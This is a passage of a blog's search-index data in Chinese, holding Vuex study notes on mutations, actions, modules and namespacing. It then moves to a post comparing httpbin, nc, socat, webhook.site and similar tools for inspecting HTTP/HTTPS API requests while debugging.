簡單來說，當作一個data的主體，例如像健保卡一樣，裡面存放資料。 開發中，常見的參數payload是什麼? - Noel Saga ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:5:1","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"提交載荷(payload) 你可以向 store.commit 傳入額外的參數，即 mutation 的載荷（payload）： // ... mutations: { increment (state, n) { state.count += n } } store.commit('increment', 10) GIT: https://github.com/malagege/vuex-test/commit/e04820c2cd0245e0faee9364ecf0aa927c9019bc 在大多數情況下，載荷應該是一個物件，這樣可以包含多個字段並且記錄的 mutation 會更易讀： // ... mutations: { increment (state, payload) { state.count += payload.amount } } store.commit('increment', { amount: 10 }) GIT: https://github.com/malagege/vuex-test/commit/d033910dafe268599615e67d374ecb33709cc5dc ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:5:2","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"commit 使用物件傳值 store.commit({ type: 'increment', amount: 10 }) mutations: { increment (state, payload) { state.count += payload.amount } } GIT: https://github.com/malagege/vuex-test/commit/caa624c19d4741924f3abe5c9f6d0f5b93cb34f3 ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:6:0","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"使用常量替代 Mutation 事件類型 使用常量替代 mutation 事件類型在各種 Flux 實現中是很常見的模式。這樣可以使 linter 之類的工具發揮作用，同時把這些常量放在單獨的文件中可以讓你的代碼合作者對整個 app 包含的 mutation 一目瞭然： // mutation-types.js export const SOME_MUTATION = 'SOME_MUTATION' // store.js import { createStore } from 'vuex' import { SOME_MUTATION } from './mutation-types' const store = createStore({ state: { ... }, mutations: { // 我們可以使用 ES2015 風格的計算屬性命名功能來使用一個常量作為函數名 [SOME_MUTATION] (state) { // 修改 state } } }) 用不用常量取決於你——在需要多人協作的大型項目中，這會很有幫助。但如果你不喜歡，你完全可以不這樣做。 GIT: https://github.com/malagege/vuex-test/commit/00841e0ede5e9473df641eff3646f69dade93256 ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:6:1","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"Mutation 必須是同步函數 一條重要的原則就是要記住 mutation 必須是同步函數。為什麼？請參考下面的例子： mutations: { someMutation (state) { api.callAsyncMethod(() =\u003e { state.count++ }) } } 現在想像，我們正在 debug 一個 app 並且觀察 devtool 中的 mutation 日誌。每一條 mutation 被記錄，devtools 都需要捕捉到前一狀態和後一狀態的快照。然而，在上面的例子中 mutation 中的異步函數中的回調讓這不可能完成：因為當 mutation 觸發的時候，回調函數還沒有被調用，devtools 不知道什麼時候回調函數實際上被調用——實質上任何在回調函數中進行的狀態的改變都是不可追蹤的。 這邊參考範例調整:手把手教你使用Vuex，猴子都能看懂的教程 // 創建一個新的 store 實例 const store = createStore({ state: { name: '張三', number: 0, }, mutations: { setNumberIsWhat(state, payload) { setTimeout(() =\u003e { state.number = payload.number; }, 1000); }, } }); console.log(`舊值：${store.state.number}`); store.commit('setNumberIsWhat',{ number: 20 }) // await store.dispatch('setNum'); console.log(`新值：${store.state.number}`); 非同步測試 mutations: { setNumberIsWhat(state, payload) { setTimeout(() =\u003e { state.number = payload.number; }, 1000); }, } 結果: GIT: https://github.com/malagege/vuex-test/commit/739138bbef8a7ed162456fafbf7a9d5808b4f1d2 同步測試 mutations: { setNumberIsWhat(state, payload) { // setTimeout(() =\u003e { state.number = payload.number; // }, 1000); }, } 結果: 這邊結果來看，官方Mutition為什麼會關連DevTools原因所在。 ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:6:2","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"mapMutation import { mapMutations } from 'vuex' export default { // ... methods: { ...mapMutations([ 'increment', // 將 `this.increment()` 映射為 `this.$store.commit('increment')` // `mapMutations` 也支持載荷： 'incrementBy' // 將 `this.incrementBy(amount)` 映射為 `this.$store.commit('incrementBy', amount)` ]), ...mapMutations({ add: 'increment' // 將 `this.add()` 映射為 `this.$store.commit('increment')` }) } } 用法跟之前差不多。 ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:6:3","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"心得整理 其實當初看的時候一直在想為什麼要分 Mutation 和 Action，其實不照這樣做，程式也是可以使用的，但是這樣做的話，程式可能不容易看，維護上也不方便。Mutation觸發是透過store.commit去操作，在使用上跟 Web 觸發事件(Event)很像。 奇怪?我的程式沒有很複雜動作，一定要經過 Action 嗎?目前我看，應該也可以Component method，畢竟官方都給了 mapMutation不用嗎?XD ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:6:4","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"Action Action 類似於 mutation，不同在於： Action 提交的是 mutation，而不是直接變更狀態(state)。 Action 可以包含任意異步操作。 const store = createStore({ state: { count: 0 }, mutations: { increment (state) { state.count++ } }, actions: { increment (context) { context.commit('increment') } } }) Action 函數接受一個與 store 實例具有相同方法和屬性的 context 對象，因此你可以調用 context.commit 提交一個 mutation，或者通過 context.state 和 context.getters 來獲取 state 和 getters。當我們在之後介紹到 Modules 時，你就知道 context 對象為什麼不是 store 實例本身了。 實踐中，我們會經常用到 ES2015 的參數解構來簡化代碼（特別是我們需要調用 commit 很多次的時候）： lukehoban/es6features: Overview of ECMAScript 6 features actions: { increment ({ commit }) { commit('increment') } } ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:7:0","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"分發 Action Action 通過 store.dispatch 方法觸發 store.dispatch('increment') GIT: https://github.com/malagege/vuex-test/commit/637dfc3482613d86027ee32af369ede218793438 乍一眼看上去感覺多此一舉，我們直接分發 mutation 豈不更方便？實際上並非如此，還記得 mutation 必須同步執行這個限制麼？Action 就不受約束！我們可以在 action 內部執行異步操作： actions: { incrementAsync ({ commit }) { setTimeout(() =\u003e { commit('increment') }, 1000) } } Actions 支持同樣的載荷(payload)方式和物件方式進行分發： // 以載荷形式分發 store.dispatch('incrementAsync', { amount: 10 }) // 以物件形式分發 store.dispatch({ type: 'incrementAsync', amount: 10 }) GIT: https://github.com/malagege/vuex-test/commit/c0de63b661c0addc1edc6e24da3cb920cd242ab3 來看一個更加實際的購物車示例，涉及到調用異步 API 和分發多重 mutation： actions: { checkout ({ commit, state }, products) { // 把當前購物車的物品備份起來 const savedCartItems = [...state.cart.added] // 發出結賬請求，然後樂觀地清空購物車 commit(types.CHECKOUT_REQUEST) // 購物 API 接受一個成功回調和一個失敗回調 shop.buyProducts( products, // 成功操作 () =\u003e commit(types.CHECKOUT_SUCCESS), // 失敗操作 () =\u003e commit(types.CHECKOUT_FAILURE, savedCartItems) ) } } ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:7:1","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"在組件中分發 Action(mapActions) 你在組件中使用 this.$store.dispatch('xxx') 分發 action，或者使用 mapActions 輔助函數將組件的 methods 映射為 store.dispatch 調用（需要先在根節點注入 store）： import { mapActions } from 'vuex' export default { // ... methods: { ...mapActions([ 'increment', // 將 `this.increment()` 映射為 `this.$store.dispatch('increment')` // `mapActions` 也支持載荷： 'incrementBy' // 將 `this.incrementBy(amount)` 映射為 `this.$store.dispatch('incrementBy', amount)` ]), ...mapActions({ add: 'increment' // 將 `this.add()` 映射為 `this.$store.dispatch('increment')` }) } } ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:7:2","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"組合 Action(重點) Action 通常是異步的，那麼如何知道 action 什麼時候結束呢？更重要的是，我們如何才能組合多個 action，以處理更加複雜的異步流程？ 首先，你需要明白 store.dispatch 可以處理被觸發的 action 的處理函數返回的 Promise，並且 store.dispatch 仍舊返回 Promise： actions: { actionA ({ commit }) { return new Promise((resolve, reject) =\u003e { setTimeout(() =\u003e { commit('someMutation') resolve() }, 1000) }) } } 現在你可以： store.dispatch('actionA').then(() =\u003e { // ... }) 在另外一個 action 中也可以： actions: { // ... actionB ({ dispatch, commit }) { return dispatch('actionA').then(() =\u003e { commit('someOtherMutation') }) } } 最後，如果我們利用 async / await，我們可以如下組合 action： // 假設 getData() 和 getOtherData() 返回的是 Promise actions: { async actionA ({ commit }) { commit('gotData', await getData()) }, async actionB ({ dispatch, commit }) { await dispatch('actionA') // 等待 actionA 完成 commit('gotOtherData', await getOtherData()) } } GIT: https://github.com/malagege/vuex-test/commit/4d639191a71bd674fffc7593a097f44673dcdf63 ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:7:3","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"Mutation / Action 差異 \\ Mutation Action 呼叫 commit dispatch 呼叫Function 第一個參數 State Context 限制 不可用非同步 可用非同步 乍看之下，Mutation 和 Action 真的很像，但是 Mutation 主要修改 State ，所以 Function 第一個參數是 State。Action 可以做很多事情(取API資料、取 State 資料…)，我原本以為取 State 都要在所有 Component 去做，但 Action 應該也能做到??但感覺用外面帶進去會比較好?(符合DI原則)，之後有確定答案再補充… ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:7:4","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"mapMutations,mapActions 會自動映射 payload 實作使用mapMutations, mapActions，發現想帶入 payload ，但mapMutations / mapActions 都可以映射參數。官方文件就有說明。一不小心就漏掉，我真是後知後覺 ...mapActions([ // `mapActions` 也支持載荷： 'incrementBy' // 將 `this.incrementBy(amount)` 映射為 `this.$store.dispatch('incrementBy', amount)` }) ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:7:5","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"mapState,mapGetters,mapMutations,mapActions 這邊我發現 mapXXX，只有 State 是單數，其他都是複數。我覺得我之後可能會忘記，特別說一下。簡單來說，State 只有一個，Getters,Mutations,Actions有很多 function 組成。這樣記應該會比較好。 ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:7:6","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"該加強 Promise / Async 看本篇 Action 範例，有許多 Promse / Async 用法，讓我覺得還可以這樣用!!可能有空要加強一下，希望自己使用不會用到爆炸，哈哈。 ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:7:7","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"Module 看到很多教學沒有交到 Module，因為我覺得 Vuex 文章不多，想說把他看完。除非遇到不會的，例如 v-solt 不會，就先跳過。 為瞭解決以上問題，Vuex 允許我們將 store 分割成模塊（module）。每個模塊擁有自己的 state、mutation、action、getter、甚至是嵌套子模塊——從上至下進行同樣方式的分割： const moduleA = { state: () =\u003e ({ ... }), mutations: { ... }, actions: { ... }, getters: { ... } } const moduleB = { state: () =\u003e ({ ... }), mutations: { ... }, actions: { ... } } const store = createStore({ modules: { a: moduleA, b: moduleB } }) store.state.a // -\u003e moduleA 的狀態 store.state.b // -\u003e moduleB 的狀態 ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:8:0","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"模塊的局部狀態(使用rootState) 對於模塊內部的 mutation 和 getter，接收的第一個參數是模塊的局部狀態對象。 一般常用第一參數 const moduleA = { state: () =\u003e ({ count: 0 }), mutations: { increment (state) { // 這裡的 `state` 對象是模塊的局部狀態 state.count++ } }, getters: { doubleCount (state) { return state.count * 2 } } } Action const moduleA = { // ... actions: { incrementIfOddOnRootSum ({ state, commit, rootState }) { if ((state.count + rootState.count) % 2 === 1) { commit('increment') } } } } Getter const moduleA = { // ... getters: { sumWithRootCount (state, getters, rootState) { return state.count + rootState.count } } } ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:8:1","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"命名空間(預設全域) Getter , Action, Mutation 都是全局宣告的。仔細想想也對，像 JavaScript 也是全域宣告 Event。 Vuex 也有做 namesapce， 參考官方範例也不難。 觀察幾點記錄一下: 這邊我自己看 namespace: true，只宣告 moduole某屬性上面，不會加在 跟 store 上面，因為在跟 store 沒有甚麼意義。 module 裡面載入別的 module 會繼承父模塊的命名空間。參考下面官方範例: myPage 內層 module 可以重新命名空間。參考下面範例: posts const store = createStore({ modules: { account: { namespaced: true, // 模塊內容（module assets） state: () =\u003e ({ ... }), // 模塊內的狀態已經是嵌套的了，使用 `namespaced` 屬性不會對其產生影響 getters: { isAdmin () { ... } // -\u003e getters['account/isAdmin'] }, actions: { login () { ... } // -\u003e dispatch('account/login') }, mutations: { login () { ... } // -\u003e commit('account/login') }, // 嵌套模塊 modules: { // 繼承父模塊的命名空間 myPage: { state: () =\u003e ({ ... }), getters: { profile () { ... } // -\u003e getters['account/profile'] } }, // 進一步嵌套命名空間 posts: { namespaced: true, state: () =\u003e ({ ... }), getters: { popular () { ... } // -\u003e getters['account/posts/popular'] } } } } } }) 啟用了命名空間的 getter 和 action 會收到局部化的 getter，dispatch 和 commit。換言之，你在使用模塊內容（module assets）時不需要在同一模塊內額外添加空間名前綴。更改 namespaced 屬性後不需要修改模塊內的代碼。 下面範例會看到，再進行比較。 在帶命名空間的模塊內訪問全域內容（Global Assets） 如果你希望使用全局 state 和 getter，rootState 和 rootGetters 會作為第三和第四參數傳入 getter，也會通過 context 對象的屬性傳入 action。 若需要在全局命名空間內分發 action 或提交 mutation，將 { root: true } 作為第三參數傳給 dispatch 或 commit 即可。 參考官方範例就會了解。 modules: { foo: { namespaced: true, getters: { // 在這個模塊的 getter 中，`getters` 被局部化了 // 你可以使用 getter 的第四個參數來調用 `rootGetters` someGetter (state, getters, rootState, rootGetters) { getters.someOtherGetter // -\u003e 'foo/someOtherGetter' rootGetters.someOtherGetter // -\u003e 'someOtherGetter' }, someOtherGetter: state =\u003e { ... } }, actions: { // 在這個模塊中， dispatch 和 commit 也被局部化了 // 他們可以接受 `root` 屬性以訪問根 dispatch 或 commit someAction ({ dispatch, commit, getters, rootGetters }) { getters.someGetter // -\u003e 'foo/someGetter' rootGetters.someGetter // -\u003e 'someGetter' dispatch('someOtherAction') // -\u003e 'foo/someOtherAction' dispatch('someOtherAction', null, { root: true }) // -\u003e 'someOtherAction' commit('someMutation') // -\u003e 'foo/someMutation' commit('someMutation', null, { root: true }) // -\u003e 'someMutation' }, someOtherAction (ctx, payload) { ... } } } } 這邊還有一點比較特別，若需要在全局命名空間內分發 action 或提交 mutation，將 { root: true } 作為第三參數傳給 dispatch 或 commit 即可。 dispatch('someOtherAction') // -\u003e 'foo/someOtherAction' dispatch('someOtherAction', null, { root: true }) // -\u003e 'someOtherAction' commit('someMutation') // -\u003e 'foo/someMutation' commit('someMutation', null, { root: true }) // -\u003e 'someMutation' ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:8:2","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"在帶命名空間的模塊註冊全局 action 若需要在帶命名空間的模塊註冊全局 action，你可添加 root: true，並將這個 action 的定義放在函數 handler 中。例如： { actions: { someOtherAction ({dispatch}) { dispatch('someAction') } }, modules: { foo: { namespaced: true, actions: { someAction: { root: true, handler (namespacedContext, payload) { ... } // -\u003e 'someAction' } } } } } 老實說不太了解這邊能印用在哪邊，但是可以透過子組件宣告全域Action 事件。 ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:8:3","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"帶命名空間的綁定函數 當使用 mapState、mapGetters、mapActions 和 mapMutations 這些函數來綁定帶命名空間的模塊時，寫起來可能比較繁瑣： computed: { ...mapState({ a: state =\u003e state.some.nested.module.a, b: state =\u003e state.some.nested.module.b }) }, methods: { ...mapActions([ 'some/nested/module/foo', // -\u003e this['some/nested/module/foo']() 'some/nested/module/bar' // -\u003e this['some/nested/module/bar']() ]) } } 對於這種情況，你可以將模塊的空間名稱字符串作為第一個參數傳遞給上述函數，這樣所有綁定都會自動將該模塊作為上下文。於是上面的例子可以簡化為： computed: { ...mapState('some/nested/module', { a: state =\u003e state.a, b: state =\u003e state.b }) }, methods: { ...mapActions('some/nested/module', [ 'foo', // -\u003e this.foo() 'bar' // -\u003e this.bar() ]) } 而且，你可以通過使用 createNamespacedHelpers 創建基於某個命名空間輔助函數。它返回一個對象，對象裡有新的綁定在給定命名空間值上的組件綁定輔助函數： import { createNamespacedHelpers } from 'vuex' const { mapState, mapActions } = createNamespacedHelpers('some/nested/module') export default { computed: { // 在 `some/nested/module` 中查找 ...mapState({ a: state =\u003e state.a, b: state =\u003e state.b }) }, methods: { // 在 `some/nested/module` 中查找 ...mapActions([ 'foo', 'bar' ]) } } 後面就先跳過。Module | Vuex ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:8:4","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"項目結構 做前面其實我大概知道 store 可以拆出來一個 js，但我為了方便測試還是先放 main.js。 官方還很好貼個範例: vuex/examples/classic/shopping-cart at 4.0 · vuejs/vuex ├── index.html ├── main.js ├── api │ └── ... # 抽取出API請求 ├── components │ ├── App.vue │ └── ... └── store ├── index.js # 我們組裝模塊並導出 store 的地方 ├── actions.js # 根級別的 action ├── mutations.js # 根級別的 mutation └── modules ├── cart.js # 購物車模塊 └── products.js # 產品模塊 ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:9:0","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"組合式API import { useStore } from 'vuex' export default { setup () { const store = useStore() } } 這邊用法就跟之前差不多，所以就不貼了。可參考:組合式API | Vuex 官方範例:vuex/examples/composition at 4.0 · vuejs/vuex ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:10:0","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"嚴格模式 const store = createStore({ // ... strict: true }) ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:11:0","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"開發環境與發佈環境 const store = createStore({ // ... strict: process.env.NODE_ENV !== 'production' }) ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:11:1","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"表單處理 \u003cinput v-model=\"message\"\u003e computed: { message: { get () { return this.$store.state.obj.message }, set (value) { this.$store.commit('updateMessage', value) } } } 表单处理 | Vuex ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:12:0","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["實用工具"],"content":"最近程式測試API，有時候好奇程式傳出去內容是否跟 Postman 一樣，但是 DEBUG 時候真的不方便。最近在想有什麼方法(或工具)可以做到? 之前有看到有用 SSLKEYLOGFILE 可以用 Wireshark 解封包。深入理解 TLS/SSL 安全加密協定 雖然 Java 也有看到類似方法，但是要特別設定 jSSLKeyLog，還要安裝 Wireshark 軟體，所以覺得很麻煩? 最近看有沒有比較簡單方式測試?稍微爬一下文整理 HTTP test server accepting GET/POST requests - Stack Overflow 裡面看到 socat 大法最方便，可看封包又能轉傳！ ","date":"2021-06-27","objectID":"/blog/posts/%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95/:0:0","tags":["http","https","api","request"],"title":"看 HTTP 和 HTTPS API 服務封包參數方法","uri":"/blog/posts/%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"Httpbin httpbin.org docker run -p 80:80 kennethreitz/httpbin 但這點在程式直覺看結果還是很不方便 ","date":"2021-06-27","objectID":"/blog/posts/%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95/:1:0","tags":["http","https","api","request"],"title":"看 HTTP 和 HTTPS API 服務封包參數方法","uri":"/blog/posts/%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"Post Test Server V2 PTS - V2 有 http , https 方式接收資料，還算不錯。但沒有自己架設版本 ","date":"2021-06-27","objectID":"/blog/posts/%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95/:2:0","tags":["http","https","api","request"],"title":"看 HTTP 和 HTTPS API 服務封包參數方法","uri":"/blog/posts/%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"nc 推薦使用這個指令，簡單好用。不知道 socat 也能不能做到這種事情，還能順便轉送出去封包?XD(下面有實作出來) 最大缺點應該就是不能 https nc -kdl localhost 8000 ","date":"2021-06-27","objectID":"/blog/posts/%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95/:3:0","tags":["http","https","api","request"],"title":"看 HTTP 和 HTTPS API 服務封包參數方法","uri":"/blog/posts/%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"socat 超級推薦使用這個指令，可看到資料，又可以推送出去，不是很棒嗎!!連 https 都能搞定 socat -v TCP-LISTEN:8080,fork,reuseaddr TCP:tw.yahoo.com:80 # http to https socat -v TCP-LISTEN:8080,fork,reuseaddr OPENSSL:web_url:443,verify=0 # 測試用 curl -H Host:web_url http://localhost:8080/ 這邊加 verify=0 是不能檢查憑證，這樣可以用瀏覽器看，但網站有做 Host 驗證的話，可以設定瀏覽器 Header設定 Host ，找ModHeader - Chrome 線上應用程式商店就能做到，不然就是改 Host檔案。這個是參考 Traefik 那篇(在 Raspberry PI 架設 Traefik 初體驗 | 程式狂想筆記) 相對，API 程式要加 Header，不然就是設定 Host 檔案，目前沒有找到 socat 修改 Header 方法。 參考來源: SSH over SSL, episode 2: replacing proxytunnel with socat ","date":"2021-06-27","objectID":"/blog/posts/%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95/:4:0","tags":["http","https","api","request"],"title":"看 HTTP 和 HTTPS API 服務封包參數方法","uri":"/blog/posts/%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"webhook.site Webhook.site - Test, process and transform emails and HTTP requests 之前 line webhook 時候有用這個測試，非常好用。缺點只能用 https …，這算缺點嗎?(XD) 我要用這個測試 Java 8 憑證不認得這個網站憑證…，官方也有docker 自架服務，不過我就沒有嘗試。 ","date":"2021-06-27","objectID":"/blog/posts/%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95/:5:0","tags":["http","https","api","request"],"title":"看 HTTP 和 HTTPS API 服務封包參數方法","uri":"/blog/posts/%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"PutsReq PutsReq 也是有不錯操作，但沒有自架服務。 ","date":"2021-06-27","objectID":"/blog/posts/%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95/:6:0","tags":["http","https","api","request"],"title":"看 HTTP 和 HTTPS API 服務封包參數方法","uri":"/blog/posts/%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"其他爬到東西 vi/websocat: Command-line client for WebSockets, like netcat (or curl) for ws:// with advanced socat-like functions ","date":"2021-06-27","objectID":"/blog/posts/%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95/:7:0","tags":["http","https","api","request"],"title":"看 HTTP 和 HTTPS API 